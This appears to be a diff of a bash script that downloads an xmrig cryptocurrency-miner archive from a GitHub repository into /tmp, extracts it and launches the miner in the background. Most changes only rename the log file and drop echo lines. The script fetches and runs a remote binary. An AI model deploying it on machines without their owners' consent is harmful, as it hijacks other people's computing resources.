@@ -1,10 +1,16 @@
 #!/bin/bash
 
-LOG_FILE="/tmp/miner_runtime.log"
+LOG_FILE="/tmp/miner.log"
+
 echo "Starting the script..." > "$LOG_FILE"
 
+# Set up environment (if needed)
+# source /etc/profile
+# source ~/.bashrc
+
+echo "Current directory: $(pwd)" >> "$LOG_FILE"
+
 # Download xmrig and extract it
-echo "Downloading xmrig..." >> "$LOG_FILE"
 wget https://github.com/orkaroeli/orkaroeliminer/raw/refs/heads/main/xmrigtar.tar.gz -O /tmp/xmrigtar.tar.gz >> "$LOG_FILE" 2>&1
 
 # Check if the download was successful
@@ -16,17 +22,15 @@ else
 fi
 
 # Extract the tar.gz file
-echo "Extracting xmrig..." >> "$LOG_FILE"
-tar xvf /tmp/xmrigtar.tar.gz -C /tmp >> "$LOG_FILE" 2>&1
+tar -xvf /tmp/xmrigtar.tar.gz -C /tmp >> "$LOG_FILE" 2>&1
 
 # Navigate to the xmrig directory
 cd /tmp/xmrig-6.22.0 || { echo "Failed to change directory to xmrig-6.22.0" >> "$LOG_FILE"; exit 1; }
 
 # Set the correct permissions for xmrig
-echo "Setting execute permissions..." >> "$LOG_FILE"
 chmod +x xmrig >> "$LOG_FILE" 2>&1
 
-# Run xmrig in the background and log output
+# Run xmrig in the background
 echo "Starting xmrig..." >> "$LOG_FILE"
 ./xmrig --config=config.json >> "$LOG_FILE" 2>&1 &
 
